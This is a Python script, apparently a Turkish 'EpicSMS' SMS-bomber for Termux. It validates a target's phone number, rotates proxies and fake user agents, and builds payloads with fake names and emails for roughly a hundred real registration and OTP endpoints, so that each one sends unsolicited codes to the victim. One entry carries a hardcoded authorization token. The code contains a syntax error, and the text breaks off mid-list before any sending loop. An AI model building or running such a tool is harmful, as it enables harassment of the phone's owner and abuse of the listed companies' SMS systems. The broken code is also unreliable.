# -*- coding: utf-8 -*-

import subprocess
import sys
import os
import asyncio
import aiohttp
import logging
import re
import random
import time
import sqlite3
from datetime import datetime
import colorama
from colorama import Fore, Style
import coloredlogs
from faker import Faker
import string
import urllib.parse
import json
import uuid
from tqdm import tqdm
import requests
from fake_useragent import UserAgent

# Termux’ta gerekli modüllerin kontrolü ve kurulumu
required_modules = [
    "aiohttp", "faker", "colorama", "coloredlogs", "tqdm", "requests", "fake-useragent"
]
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        print(f"EpicSMS: {module} indiriliyor...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])

# Başlatma
colorama.init()
faker = Faker()
ua = UserAgent()
LANGUAGE = "TR"

# Global değişkenler
all_sends = 0
success_sends = 0
failed_sends = 0
running = False

# Log ayarları
logging.basicConfig(filename='epicsms_log.txt', level=logging.INFO, format='%(asctime)s - EpicSMS - %(message)s')
coloredlogs.install(level='INFO', fmt='%(asctime)s - EpicSMS - [%(levelname)s] %(message)s')

# Veritabanı başlatma (Termux’ta dosya yolu)
db_path = os.path.join(os.getcwd(), 'api_status.db')
conn = sqlite3.connect(db_path)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS apis (name TEXT PRIMARY KEY, success INT, failure INT)''')
conn.commit()

# Telefon numarası doğrulama
def validate_phone_number(phone):
    phone = str(phone).strip()
    if not re.match(r'^\d{10}$', phone) or phone[0] != '5':
        raise ValueError("Geçersiz numara! 10 hane ve 5 ile başlamalı (örn: 5551234567)")
    return f"90{phone}"

# Proxy listesi çekme
def fetch_proxies():
    try:
        response = requests.get("https://www.proxy-list.download/api/v1/get?type=https")
        return [line.strip() for line in response.text.split('\n') if line.strip()]
    except Exception as e:
        logging.error(f"Proxy listesi çekilemedi: {e}")
        return []

# SMS Sağlayıcı Sınıfı
class SMSProvider:
    def __init__(self, name, url, payload_func, success_condition, method="POST", headers=None, cooldown=0):
        self.name = name
        self.url = url
        self.payload_func = payload_func
        self.success_condition = success_condition
        self.method = method
        self.headers = headers or {}
        self.cooldown = cooldown
        self.last_used = 0
        self.disabled = False

# Payload Fonksiyonları (107 API)
def kigili_payload(n): return {"first_name": faker.first_name(), "last_name": faker.last_name(), "email": faker.email(), "phone": f"0{n[2:]}", "password": "nwejkfıower32", "confirm": "true", "kvkk": "true", "next": ""}
def kahvedunyasi_payload(n): return {"mobile_number": n[2:], "token_type": "register_token"}
def wmf_payload(n): return {"confirm": "true", "date_of_birth": "1956-03-01", "email": faker.email(), "email_allowed": "true", "first_name": faker.first_name(), "gender": "male", "last_name": faker.last_name(), "phone": f"0{n[2:]}", "password": "nwejkfıower32"}
def tiklagelsin_payload(n): return {"operationName": "GENERATE_OTP", "variables": {"phone": f"+90{n[2:]}", "challenge": str(uuid.uuid4()), "deviceUniqueId": f"web_{uuid.uuid4()}"}, "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"}
def bim_payload(n): return {"phone": n[2:]}
def sok_payload(n): return {"mobile_number": n[2:], "token_type": "register_token"}
def migros_payload(n): return {"phoneNumber": n[2:]}
def a101_payload(n): return {"phone": f"0{n[2:]}", "next": "/a101-kapida"}
def sakas_payload(n): return {"phone": f"0{n[2:]}"}
def zarinplus_payload(n): return {"phone_number": n}
def coregap_payload(n): return None
def icq_payload(n): return f"client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{n[2:]}&platform=ios&r=796356153&smsFormatType=human"
def naosstars_payload(n): return {"email": faker.email(), "first_name": faker.first_name(), "last_name": faker.last_name(), "password": "nwejkDsOpOJıower32.", "date_of_birth": "1975-12-31", "phone": f"0{n[2:]}", "gender": "male", "kvkk": "true", "contact": "true", "confirm": "true"}
def rentiva_payload(n): return {"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": n[2:], "type": 1}
def loncamarket_payload(n): return {"Address": n[2:], "ConfirmationType": 0}
def ceconline_payload(n): return {"mobileNumber": n[2:], "method": "getDynamicCode", "verifyType": "MOBILE_NUM_REG", "captcharType": "", "time": str(int(time.time() * 1000))}
def ntjxj_payload(n): return {"sjhm": n[2:]}
def itjuzi_payload(n): return {"account": n[2:]}
def yifatong_payload(n): return {"rnd": f"{time.time():.3f}", "mobile": n[2:]}
def dominicsolanke_payload(n): return None
def customsms_payload(n): return {"number": n[2:], "sms_count": 5}
def nbpsms_payload(n): return None
def vonsh_payload(n): return None
def shijiebang_payload(n): return {"mobile": n[2:], "type": "1"}
def anadolu_payload(n): return urllib.parse.urlencode({"Numara": f"{n[2:5]}{n[5:8]}{n[8:10]}{n[10:12]}"})
def aygaz_payload(n): return {"Gsm": n[2:]}
def bisu_payload(n): return {"phoneNumber": n[2:]}
def coffy_payload(n): return {"phoneNumber": f"+90{n[2:]}"}
def defacto_payload(n): return {"mobilePhone": f"0{n[2:]}"}
def englishhome_payload(n): return {"first_name": faker.first_name(), "last_name": faker.last_name(), "email": faker.email(), "phone": f"0{n[2:]}", "password": "nwejkfıower32", "email_allowed": False, "sms_allowed": False, "=("confirm": True, "tom_pay_allowed": True}
def filemarket_payload(n): return {"mobilePhoneNumber": f"90{n[2:]}"}
def gez_payload(n): return None
def gofody_payload(n): return {"country_code": "90", "phone": n[2:]}
def goyakit_payload(n): return None
def hayat_payload(n): return None
def heyscooter_payload(n): return None
def hizliecza_payload(n): return {"phoneNumber": f"+90{n[2:]}", "otpOperationType": 2}
def hop_payload(n): return {"phone": f"+90{n[2:]}"}
def ikinciyeni_payload(n): return {"accountType": 1, "email": faker.email(), "isAddPermission": False, "name": faker.first_name(), "lastName": faker.last_name(), "phone": n[2:]}
def ipragaz_payload(n): return {"otp": "", "phoneNumber": n[2:]}
def istegelsin_payload(n): return {"query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": f"90{n[2:]}"}}
def jetle_payload(n): return None
def joker_payload(n): return {"phone": n[2:]}
def kalmasin_payload(n): return {"dil": "tr", "device_id": "", "notification_mobile": "android-notificationid-will-be-added", "platform": "android", "version": "2.0.6", "login_type": 1, "telefon": n[2:]}
def karma_payload(n): return {"phoneNumber": f"90{n[2:]}", "type": "REGISTER", "deviceId": faker.uuid4(), "language": "tr-TR"}
def kimgbister_payload(n): return {"msisdn": f"90{n[2:]}"}
def macrocenter_payload(n): return {"phoneNumber": n[2:]}
def marti_payload(n): return {"mobilePhone": n[2:], "mobilePhoneCountryCode": "90"}
def ninewest_payload(n): return {"alertMeWithEMail": False, "alertMeWithSms": False, "dataPermission": True, "email": faker.email(), "genderId": random.randint(0, 3), "hash": "5488b0f6de", "inviteCode": "", "password": faker.password(), "phoneNumber": f"({n[2:5]}) {n[5:8]} {n[8:10]} {n[10:12]}", "registerContract": True, "registerMethod": "mail", "version": "3"}
def oliz_payload(n): return {"mobile_number": n[2:], "type": None}
def pawapp_payload(n): return {"languageId": "2", "mobileInformation": "", "data": {"firstName": faker.first_name(), "lastName": faker.last_name(), "userAgreement": "true", "kvkk": "true", "email": faker.email(), "phoneNo": n[2:], "username": faker.user_name()}}
def paybol_payload(n): return {"otp_code": "null", "phone_number": f"90{n[2:]}", "reference_id": "null"}
def petrolofisi_payload(n): return {"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{n[2:]}", "name": faker.first_name(), "plate": f"{random.randint(1, 81):02d}{''.join(random.choices(string.ascii_uppercase, k=3))}{random.randint(1, 999):03d}", "positiveCard": "", "referenceCode": "", "surname": faker.last_name()}
def pinar_payload(n): return {"MobilePhone": n[2:]}
def pisir_payload(n): return {"msisdn": f"90{n[2:]}"}
def qumpara_payload(n): return {"msisdn": n[2:]}
def rabbit_payload(n): return {"mobile_number": f"+90{n[2:]}", "os_name": "android", "os_version": "7.1.2", "app_version": "1.0.2(12)", "push_id": "-"}
def roombadi_payload(n): return {"phone": n[2:], "countryId": 2}
def saka_payload(n): return {"gsm": f"0{n[2:]}"}
def scooby_payload(n): return None
def signalall_payload(n): return {"name": "", "phone": {"number": n[2:], "code": "90", "country_code": "TR", "name": ""}, "countryCallingCode": "+90", "countryCode": "TR", "approved": True, "notifyType": 99, "favorites": [], "appKey": "live-exchange"}
def superpedestrian_payload(n): return {"phone_number": f"+90{n[2:5]} {n[5:8]} {n[8:12]}"}
def sushico_payload(n): return {"phone": f"+90{n[2:]}", "location": 1, "locale": "tr"}
def tazi_payload(n): return {"cep_tel": n[2:], "cep_tel_ulkekod": "90"}
def total_payload(n): return None
def weescooter_payload(n): return {"tenant": "62a1e7efe74a84ea61f0d588", "gsm": n[2:]}
def yotto_payload(n): return {"phone": f"+90 ({n[2:5]}) {n[5:8]}-{n[8:12]}"}
def trendyol_payload(n): return {"phoneNumber": f"90{n[2:]}"}
def getir_payload(n): return {"user": {"phone_number": f"+90{n[2:5]} {n[5:8]} {n[8:12]}"}}
def yemeksepeti_payload(n): return {"phone": f"0{n[2:]}", "type": 1}
def hepsiburada_payload(n): return {"mobilePhoneNumber": f"90{n[2:]}"}
def amazontr_payload(n): return {"phoneNumber": f"+90{n[2:]}", "channel": "SMS"}
def mediapark_payload(n): return {"phoneNumber": f"90{n[2:]}"}
def teknostore_payload(n): return {"phone": f"0{n[2:]}"}
def ebebek_payload(n): return {"mobilePhone": f"90{n[2:]}"}
def otomobil_payload(n): return {"phone": f"0{n[2:]}", "code": ""}
def baydoner_payload(n): return {"phone": f"0{n[2:]}"}
def netgsm_payload(n): return {"usercode": os.getenv("NETGSM_USER"), "password": os.getenv("NETGSM_PASS"), "gsmno": n[2:], "message": "Test SMS", "msgheader": "EpicSMS"}
def twilio_payload(n): return {"To": f"+90{n[2:]}", "From": os.getenv("TWILIO_PHONE"), "Body": "Test SMS"}
def nexmo_payload(n): return {"api_key": os.getenv("NEXMO_KEY"), "api_secret": os.getenv("NEXMO_SECRET"), "to": n[2:], "from": "EpicSMS", "text": "Test SMS"}
def messagebird_payload(n): return {"originator": "EpicSMS", "recipients": n[2:], "body": "Test SMS"}
def plivo_payload(n): return {"src": "EpicSMS", "dst": n[2:], "text": "Test SMS"}
def telnyx_payload(n): return {"from": "+12025550123", "to": f"+90{n[2:]}", "body": "Test SMS"}
def clicksend_payload(n): return {"messages": [{"source": "EpicSMS", "from": "EpicSMS", "to": f"+90{n[2:]}", "body": "Test SMS"}]}
def sinch_payload(n): return {"from": "EpicSMS", "to": [n[2:]], "body": "Test SMS"}
def textmagic_payload(n): return {"phones": n[2:], "text": "Test SMS"}
def telesign_payload(n): return {"phone_number": n[2:], "message": "Test SMS", "message_type": "ARN"}
def bulksms_payload(n): return {"to": n[2:], "body": "Test SMS"}
def smsglobal_payload(n): return {"origin": "EpicSMS", "destination": n[2:], "message": "Test SMS"}
def clickatell_payload(n): return {"content": "Test SMS", "to": [n[2:]]}
def turkcell_payload(n): return {"phone": f"0{n[2:]}"}
def turktelekom_payload(n): return {"gsmNo": n[2:]}
def boyner_payload(n): return {"phone": f"0{n[2:]}"}
def morhipo_payload(n): return {"phone": f"0{n[2:]}"}
def carrefoursa_payload(n): return {"phoneNumber": f"90{n[2:]}"}
def gratis_payload(n): return {"phone": f"0{n[2:]}"}
def koton_payload(n): return {"phone": f"0{n[2:]}"}
def youla_payload(n): return {"phone": f"+90{n[2:]}"}
def tinder_payload(n): return {"phone_number": f"+90{n[2:]}"}
def mygames_payload(n): return {"phone": n[2:]}
def beltelecom_payload(n): return {"phone": n[2:]}
def twitch_payload(n): return {"phone_number": f"+90{n[2:]}"}

# Başarı Koşulları
def default_condition(r): return r.status in [200, 201, 202, 204, 205]
def coregap_condition(r): return r.status == 200
def icq_condition(r): return "ok" in r.text
def dominicsolanke_condition(r): return "success" in r.text
def twilio_condition(r): return "sid" in r.text
def nexmo_condition(r): return "message-count" in r.text
def messagebird_condition(r): return "id" in r.text
def plivo_condition(r): return "message_uuid" in r.text
def telnyx_condition(r): return "id" in r.text
def clicksend_condition(r): return "success" in r.text
def sinch_condition(r): return "id" in r.text
def textmagic_condition(r): return "id" in r.text
def telesign_condition(r): return "reference_id" in r.text
def bulksms_condition(r): return "status" in r.text
def smsglobal_condition(r): return "messageId" in r.text
def clickatell_condition(r): return "messageId" in r.text
def trendyol_condition(r): return "isSuccess" in r.text
def getir_condition(r): return r.status == 200
def yemeksepeti_condition(r): return "success" in r.text
def hepsiburada_condition(r): return r.status == 200
def amazontr_condition(r): return "OK" in r.text
def mediapark_condition(r): return "successful" in r.text
def teknostore_condition(r): return r.status == 200
def ebebek_condition(r): return "isSuccessful" in r.text
def otomobil_condition(r): return "success" in r.text.lower()
def baydoner_condition(r): return r.status == 200
def defacto_condition(r): return "IsSMSSend" in r.text
def istegelsin_condition(r): return r.status == 200
def ikinciyeni_condition(r): return "isSucceed" in r.text
def migros_condition(r): return "successful" in r.text
def bisu_condition(r): return r.status == 200
def filemarket_condition(r): return "200 OK" in r.text
def ipragaz_condition(r): return r.status == 200
def pisir_condition(r): return "ok" in r.text and "1" in r.text
def coffy_condition(r): return "success" in r.text
def sushico_condition(r): return "err" in r.text and "0" in r.text
def kalmasin_condition(r): return "success" in r.text
def yotto_condition(r): return r.status == 201
def qumpara_condition(r): return r.status == 200
def aygaz_condition(r): return r.status == 200
def pawapp_condition(r): return "success" in r.text
def paybol_condition(r): return r.status == 200
def ninewest_condition(r): return "success" in r.text
def saka_condition(r): return "status" in r.text and "1" in r.text
def superpedestrian_condition(r): return "detail" in r.text and "Ok" in r.text
def hayat_condition(r): return "IsSuccessful" in r.text
def tazi_condition(r): return r.status == 200
def gofody_condition(r): return "success" in r.text
def weescooter_condition(r): return r.status == 200
def scooby_condition(r): return r.status == 200
def gez_condition(r): return "succeeded" in r.text
def heyscooter_condition(r): return "IsSuccess" in r.text
def jetle_condition(r): return r.status == 200
def rabbit_condition(r): return "status" in r.text
def roombadi_condition(r): return r.status == 200
def hizliecza_condition(r): return "isSuccess" in r.text
def signalall_condition(r): return "success" in r.text
def goyakit_condition(r): return "success" in r.text
def pinar_condition(r): return "True" in r.text
def oliz_condition(r): return "SUCCESS_SEND_SMS" in r.text
def macrocenter_condition(r): return "successful" in r.text
def marti_condition(r): return "isSuccess" in r.text
def karma_condition(r): return r.status == 201
def joker_condition(r): return "success" in r.text
def hop_condition(r): return r.status == 201
def kimgbister_condition(r): return r.status == 200
def anadolu_condition(r): return r.status == 200
def total_condition(r): return "success" in r.text
def englishhome_condition(r): return r.status == 202
def petrolofisi_condition(r): return r.status == 204
def youla_condition(r): return "success" in r.text
def tinder_condition(r): return "otp_sent" in r.text
def mygames_condition(r): return "success" in r.text
def beltelecom_condition(r): return "success" in r.text
def twitch_condition(r): return "success" in r.text

# Sağlayıcı Listesi (107 API)
epicsms_providers = [
    SMSProvider("Kigili", "https://www.kigili.com/users/registration/", kigili_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
    SMSProvider("KahveDunyasi", "https://core.kahvedunyasi.com/api/users/sms/send", kahvedunyasi_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
    SMSProvider("WMF", "https://www.wmf.com.tr/users/register/", wmf_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
    SMSProvider("TiklaGelsin", "https://www.tiklagelsin.com/user/graphql", tiklagelsin_payload, default_condition, headers={"Content-Type": "application/json", "x-no-auth": "true"}, cooldown=5),
    SMSProvider("Bim", "https://bim.veesk.net/service/v1.0/account/login", bim_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Sok", "https://api.ceptesok.com/api/users/sendsms", sok_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Migros", "https://rest.migros.com.tr/sanalmarket/users/login/otp", migros_payload, migros_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("A101", "https://www.a101.com.tr/users/otp-login/", a101_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Sakas", "https://www.sakasu.com.tr/app/api_register/step1", sakas_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
    SMSProvider("ZarinPlus", "https://api.zarinplus.com/user/zarinpal-login", zarinplus_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("CoreGap", "https://core.gap.im/v1/user/add.json?mobile={phone_number}", coregap_payload, coregap_condition, method="GET", cooldown=5),
    SMSProvider("ICQ", "https://u.icq.net/api/v90/smsreg/requestPhoneValidation.php", icq_payload, icq_condition, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS"}, cooldown=5),
    SMSProvider("NaosStars", "https://shop.naosstars.com/users/register/", naosstars_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Rentiva", "https://rentiva.com/api/Account/Login", rentiva_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("LoncaMarket", "https://www.loncamarket.com/lid/identity/sendconfirmationcode", loncamarket_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Ceconline", "https://login.ceconline.com/thirdPartLogin.do", ceconline_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
    SMSProvider("NTJXJ", "http://www.ntjxj.com/InternetWeb/SendYzmServlet", ntjxj_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
    SMSProvider("ITJuzi", "https://www.itjuzi.com/api/verificationCodes", itjuzi_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Yifatong", "http://yifatong.com/Customers/gettcode", yifatong_payload, default_condition, method="GET", cooldown=5),
    SMSProvider("DominicSolanke", "https://dominicsolanke.u.cname.dev/api?no={phone_number[2:]}&key=cgozel&amount=1", dominicsolanke_payload, dominicsolanke_condition, method="GET", cooldown=5),
    SMSProvider("CustomSMS", "http://185.240.104.121:8000/send_sms/", customsms_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("NBPSMS", "http://202.51.182.198:8181/nbp/sms/code?phone={phone_number[2:]}", nbpsms_payload, default_condition, method="GET", cooldown=5),
    SMSProvider("VonSH", "https://von.sh?mobile={phone_number}", vonsh_payload, default_condition, method="GET", cooldown=5),
    SMSProvider("Shijiebang", "http://www.shijiebang.com/a/mobile/vcode/", shijiebang_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
    SMSProvider("Anadolu", "https://www.anadolu.com.tr/Iletisim_Formu_sms.php", anadolu_payload, anadolu_condition, headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, cooldown=5),
    SMSProvider("Aygaz", "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode", aygaz_payload, aygaz_condition, cooldown=5),
    SMSProvider("Bisu", "https://www.bisu.com.tr/api/v2/app/authentication/phone/register", bisu_payload, bisu_condition, cooldown=5),
    SMSProvider("Coffy", "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode", coffy_payload, coffy_condition, cooldown=5),
    SMSProvider("Defacto", "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms", defacto_payload, defacto_condition, cooldown=5),
    SMSProvider("EnglishHome", "https://www.englishhome.com/enh_app/users/registration/", englishhome_payload, englishhome_condition, cooldown=5),
    SMSProvider("FileMarket", "https://api.filemarket.com.tr/v1/otp/send", filemarket_payload, filemarket_condition, cooldown=5),
    SMSProvider("Gez", "https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{phone_number}", gez_payload, gez_condition, method="GET", cooldown=5),
    SMSProvider("GoFody", "https://backend.gofody.com/api/v1/enduser/register/", gofody_payload, gofody_condition, cooldown=5),
    SMSProvider("GoYakit", "https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={phone_number}&isRegistered=false", goyakit_payload, goyakit_condition, method="GET", cooldown=5),
    SMSProvider("Hayat", "https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={phone_number}", hayat_payload, hayat_condition, method="GET", cooldown=5),
    SMSProvider("HeyScooter", "https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={phone_number}", heyscooter_payload, heyscooter_condition, headers={"user-agent": "okhttp/3.12.1"}, cooldown=5),
    SMSProvider("HizliEcza", "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP", hizliecza_payload, hizliecza_condition, cooldown=5),
    SMSProvider("Hop", "https://api.hoplagit.com/v1/auth:reqSMS", hop_payload, hop_condition, cooldown=5),
    SMSProvider("IkinciYeni", "https://apigw.ikinciyeni.com/RegisterRequest", ikinciyeni_payload, ikinciyeni_condition, cooldown=5),
    SMSProvider("Ipragaz", "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp", ipragaz_payload, ipragaz_condition, cooldown=5),
    SMSProvider("IsteGelsin", "https://prod.fasapi.net/", istegelsin_payload, istegelsin_condition, cooldown=5),
    SMSProvider("Jetle", "http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={phone_number}&firmaID=1048", jetle_payload, jetle_condition, method="GET", cooldown=5),
    SMSProvider("Joker", "https://www.joker.com.tr/kullanici/ajax/check-sms", joker_payload, joker_condition, headers={"user-agent": ""}, cooldown=5),
    SMSProvider("Kalmasin", "https://api.kalmasin.com.tr/user/login", kalmasin_payload, kalmasin_condition, cooldown=5),
    SMSProvider("Karma", "https://api.gokarma.app/v1/auth/send-sms", karma_payload, karma_condition, cooldown=5),
    SMSProvider("KimGbIster", "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", kimgbister_payload, kimgbister_condition, cooldown=5),
    SMSProvider("Macrocenter", "https://www.macrocenter.com.tr/rest/users/login/otp?reid={}".format(int(time.time())), macrocenter_payload, macrocenter_condition, cooldown=5),
    SMSProvider("Marti", "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin", marti_payload, marti_condition, cooldown=5),
    SMSProvider("NineWest", "https://www.ninewest.com.tr/webservice/v1/register.json", ninewest_payload, ninewest_condition, cooldown=5),
    SMSProvider("Oliz", "https://api.oliz.com.tr/api/otp/send", oliz_payload, oliz_condition, cooldown=5),
    SMSProvider("PawApp", "https://api.pawder.app/api/authentication/sign-up", pawapp_payload, pawapp_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Paybol", "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms", paybol_payload, paybol_condition, cooldown=5),
    SMSProvider("PetrolOfisi", "https://mobilapi.petrolofisi.com.tr/api/auth/register", petrolofisi_payload, petrolofisi_condition, headers={"X-Channel": "IOS"}, cooldown=5),
    SMSProvider("Pinar", "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp", pinar_payload, pinar_condition, headers={"devicetype": "android"}, cooldown=5),
    SMSProvider("Pisir", "https://api.pisir.com/v1/login/", pisir_payload, pisir_condition, cooldown=5),
    SMSProvider("Qumpara", "https://tr-api.fisicek.com/v1.4/auth/getOTP", qumpara_payload, qumpara_condition, cooldown=5),
    SMSProvider("Rabbit", "https://api.rbbt.com.tr/v1/auth/authenticate", rabbit_payload, rabbit_condition, cooldown=5),
    SMSProvider("RoomBadi", "https://api.roombadi.com/api/v1/auth/otp/authenticate", roombadi_payload, roombadi_condition, cooldown=5),
    SMSProvider("Saka", "https://mobilcrm2.saka.com.tr/api/customer/login", saka_payload, saka_condition, cooldown=5),
    SMSProvider("Scooby", "https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{phone_number}", scooby_payload, scooby_condition, method="GET", cooldown=5),
    SMSProvider("SignalAll", "https://appservices.huzk.com/client/register", signalall_payload, signalall_condition, cooldown=5),
    SMSProvider("SuperPedestrian", "https://consumer-auth.linkyour.city/consumer_auth/register", superpedestrian_payload, superpedestrian_condition, cooldown=5),
    SMSProvider("Sushico", "https://api.sushico.com.tr/tr/sendActivation", sushico_payload, sushico_condition, cooldown=5),
    SMSProvider("Tazi", "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin", tazi_payload, tazi_condition, headers={"authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}, cooldown=5),
    SMSProvider("Total", "https://mobileapi.totalistasyonlari.com.tr/SmartSms/SendSms?gsmNo={phone_number}", total_payload, total_condition, headers={"verify": "False"}, cooldown=5),
    SMSProvider("WeeScooter", "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin", weescooter_payload, weescooter_condition, cooldown=5),
    SMSProvider("Yotto", "https://42577.smartomato.ru/account/session.json", yotto_payload, yotto_condition, cooldown=5),
    SMSProvider("Trendyol", "https://public.trendyol.com/discovery-web-socialapi-service/api/social/signup/send-otp", trendyol_payload, trendyol_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Getir", "https://food-client-api.glovoapp.com/authentication/signup", getir_payload, getir_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Yemeksepeti", "https://api.yemeksepeti.com/v13/user/request-otp", yemeksepeti_payload, yemeksepeti_condition, headers={"x-platform": "android"}, cooldown=5),
    SMSProvider("Hepsiburada", "https://www.hepsiburada.com/api/v1/otp-code/send", hepsiburada_payload, hepsiburada_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("AmazonTR", "https://www.amazon.com.tr/ap/register", amazontr_payload, amazontr_condition, cooldown=5),
    SMSProvider("MediaPark", "https://api.mediapark.com.tr/api/v1/otp/send", mediapark_payload, mediapark_condition, headers={"client-version": "2.3.7"}, cooldown=5),
    SMSProvider("TeknoStore", "https://www.teknosa.com/identity/api/v4/otp/send", teknostore_payload, teknostore_condition, cooldown=5),
    SMSProvider("Ebebek", "https://www.ebebek.com/auth/api/sms/send-otp", ebebek_payload, ebebek_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Otomobil", "https://www.otomobil.com.tr/api/auth/send-otp", otomobil_payload, otomobil_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Baydoner", "https://b2c-api.baydoner.com.tr/api/v1/auth/send-otp", baydoner_payload, baydoner_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("NetGSM", "https://api.netgsm.com.tr/sms/send/otp", netgsm_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Twilio", "https://api.twilio.com/2010-04-01/Accounts/{}/Messages.json".format(os.getenv("TWILIO_SID")), twilio_payload, twilio_condition, headers={"Authorization": "Basic {}".format(os.getenv("TWILIO_AUTH"))}, cooldown=5),
    SMSProvider("Nexmo", "https://rest.nexmo.com/sms/json", nexmo_payload, nexmo_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("MessageBird", "https://rest.messagebird.com/messages", messagebird_payload, messagebird_condition, headers={"Authorization": "AccessKey {}".format(os.getenv("MESSAGEBIRD_KEY"))}, cooldown=5),
    SMSProvider("Plivo", "https://api.plivo.com/v1/Account/{}/Message/".format(os.getenv("PLIVO_AUTH_ID")), plivo_payload, plivo_condition, headers={"Authorization": "Basic {}".format(os.getenv("PLIVO_AUTH_TOKEN"))}, cooldown=5),
    SMSProvider("Telnyx", "https://api.telnyx.com/v2/messages", telnyx_payload, telnyx_condition, headers={"Authorization": "Bearer {}".format(os.getenv("TELNYX_API_KEY"))}, cooldown=5),
    SMSProvider("ClickSend", "https://rest.clicksend.com/v3/sms/send", clicksend_payload, clicksend_condition, headers={"Authorization": "Basic {}".format(os.getenv("CLICKSEND_API_KEY"))}, cooldown=5),
    SMSProvider("Sinch", "https://messagingapi.sinch.com/v1/sms", sinch_payload, sinch_condition, headers={"Authorization": "Bearer {}".format(os.getenv("SINCH_API_KEY"))}, cooldown=5),
    SMSProvider("TextMagic", "https://rest.textmagic.com/api/v2/messages", textmagic_payload, textmagic_condition, headers={"X-TM-Username": os.getenv("TEXTMAGIC_USERNAME"), "X-TM-Key": os.getenv("TEXTMAGIC_API_KEY")}, cooldown=5),
    SMSProvider("TeleSign", "https://rest-api.telesign.com/v1/messaging", telesign_payload, telesign_condition, headers={"Authorization": "Basic {}".format(os.getenv("TELESIGN_API_KEY"))}, cooldown=5),
    SMSProvider("BulkSMS", "https://api.bulksms.com/v1/messages", bulksms_payload, bulksms_condition, headers={"Authorization": "Basic {}".format(os.getenv("BULKSMS_API_KEY"))}, cooldown=5),
    SMSProvider("SMSGlobal", "https://api.smsglobal.com/v1/sms/", smsglobal_payload, smsglobal_condition, headers={"Authorization": "Bearer {}".format(os.getenv("SMSGLOBAL_API_KEY"))}, cooldown=5),
    SMSProvider("Clickatell", "https://platform.clickatell.com/messages", clickatell_payload, clickatell_condition, headers={"Authorization": "Bearer {}".format(os.getenv("CLICKATELL_API_KEY"))}, cooldown=5),
    SMSProvider("Turkcell", "https://api.turkcell.com.tr/auth/send-otp", turkcell_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("TurkTelekom", "https://api.turktelekom.com.tr/auth/send-otp", turktelekom_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
